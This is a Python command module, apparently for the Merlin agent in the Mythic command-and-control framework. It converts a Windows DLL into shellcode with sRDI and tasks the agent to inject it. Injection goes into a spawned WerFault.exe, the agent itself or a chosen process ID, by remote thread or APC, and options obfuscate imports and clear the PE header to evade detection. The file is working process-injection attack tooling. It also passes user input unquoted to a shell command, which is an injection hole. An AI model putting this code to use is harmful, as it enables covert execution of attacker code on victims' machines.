
from merlin import MerlinJob, get_or_register_file
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class SRDIArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "dll": CommandParameter(
                name="dll",
                type=ParameterType.File,
                description="DLL to convert to shellcode",
                ui_position=0,
                required=True,
            ),
            "function-name": CommandParameter(
                name="function-name",
                type=ParameterType.String,
                description="The function to call after DllMain",
                ui_position=1,
                required=False,
            ),
            "user-data": CommandParameter(
                name="user-data",
                type=ParameterType.String,
                description="Data to pass to the target function",
                ui_position=2,
                required=False,
            ),
            "clear-header": CommandParameter(
                name="clear-header",
                type=ParameterType.Boolean,
                description="Clear the PE header on load",
                ui_position=3,
                required=False,
            ),
            "obfuscate-imports": CommandParameter(
                name="obfuscate-imports",
                description="Randomize import dependency load order",
                type=ParameterType.Boolean,
                ui_position=4,
                required=False,
            ),
            "import-delay": CommandParameter(
                name="import-delay",
                description="Number of seconds to pause between loading imports",
                type=ParameterType.Number,
                ui_position=5,
                required=False,
            ),
            "method": CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                choices=["createprocess", "self", "remote", "RtlCreateUserThread", "userapc"],
                description="The shellcode injection method to use. Use createprocess if you want output back",
                ui_position=7,
                required=True
            ),
            "pid": CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="The Process ID (PID) to inject the shellcode into. Not used with the 'self' method",
                ui_position=8,
                required=False
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the shellcode in. "
                            "Only used with the createprocess method",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=9,
                required=False,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any. "
                            "Only used with the createprocess method",
                ui_position=10,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                pass


class SRDICommand(CommandBase):
    cmd = "srdi"
    needs_admin = False
    help_cmd = "srdi"
    description = "sRDI allows for the conversion of DLL files to position independent shellcode. " \
                  "It attempts to be a fully functional PE loader supporting proper section permissions, " \
                  "TLS callbacks, and sanity checks. It can be thought of as a shellcode PE loader strapped to a " \
                  "packed DLL. https://github.com/monoxgas/sRDI."
    version = 1
    author = "@Ne0nd0g"
    argument_class = SRDIArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f'{json.loads(task.original_params)["dll"]} '

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Starting create_tasking()')

        srdi_args = []
        if task.args.get_arg("function-name"):
            srdi_args.append("--function-name")
            srdi_args.append(task.args.get_arg("function-name"))
            task.args.remove_arg("function-name")
        if task.args.get_arg("user-data"):
            srdi_args.append("--user-data")
            srdi_args.append(task.args.get_arg("user-data"))
            task.args.remove_arg("user-data")
        if task.args.get_arg("clear-header"):
            srdi_args.append("--clear-header")
            task.args.remove_arg("clear-header")
        if task.args.get_arg("obfuscate-imports"):
            srdi_args.append("--obfuscate-imports")
            task.args.remove_arg("obfuscate-imports")
        if task.args.get_arg("import-delay"):
            srdi_args.append("--import-delay")
            srdi_args.append(task.args.get_arg("import-delay"))
            task.args.remove_arg("import-delay")

        dll = await get_or_register_file(task, json.loads(task.original_params)["dll"], task.args.get_arg("dll"))

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Calling srdi()')
        srdi_shellcode, srdi_result = srdi(dll, srdi_args)
        task.stdout += f'\n{srdi_result}'

        command = {}
        if task.args.get_arg("method") == "createprocess":
            task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)

            # 1. Shellcode
            # 2. SpawnTo Executable
            # 3. SpawnTo Arguments (must include even if empty string)

            # Merlin jobs.Command message type
            command = {
                "command": "createprocess",
                "args": [srdi_shellcode, task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")],
            }
            task.display_params += f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'
        else:
            task.args.add_arg("type", MerlinJob.SHELLCODE, ParameterType.Number)

            # Merlin jobs.Command message type
            command = {
                "method": task.args.get_arg("method").lower(),
                "bytes": srdi_shellcode,
            }

            task.display_params = f'{json.loads(task.original_params)["dll"]}\n' \
                                  f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}\n' \
                                  f'Method: {task.args.get_arg("method")}'

            if task.args.get_arg("pid"):
                command["pid"] = task.args.get_arg("pid")
                task.display_params += f'\n{task.args.get_arg("pid")}'

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("dll")
        task.args.remove_arg("method")
        task.args.remove_arg("verbose")
        task.args.remove_arg("pid")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass


def srdi(dll, arguments):
    """Leverages the sRDI project to convert a Windows DLL into a reflective DLL as shellcode.

    The sRDI Python script must be previously installed at the fixed locations used in this function.
    sRDI Project: https://github.com/monoxgas/sRDI

    Parameters
    ----------
    dll : bytes
        The input Windows DLL that will be convert into shellcode
    arguments : list
        A list of arguments that will be passed to the Windows DLL

    Returns
    -------
    str
        The sRDI reflective DLL shellcode bytes as a Base64 string
    str
        The executed sRDI command line string followed by sRDI's STDOUT/STDERR text
    """
    srdi_args = ['python3', '/opt/sRDI/ConvertToShellcode.py', 'srdi.dll'] + arguments

    # Write file to location in container
    with open('srdi.dll', 'wb') as w:
        w.write(dll)

    result = subprocess.getoutput(" ".join(srdi_args))

    # Read sRDI output
    with open('srdi.bin', 'rb') as output:
        srdi_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("srdi.dll")
    os.remove("srdi.bin")

    return base64.b64encode(srdi_bytes).decode("utf-8"), f'[sRDI]\nCommandline: {" ".join(srdi_args)}\n{result}'
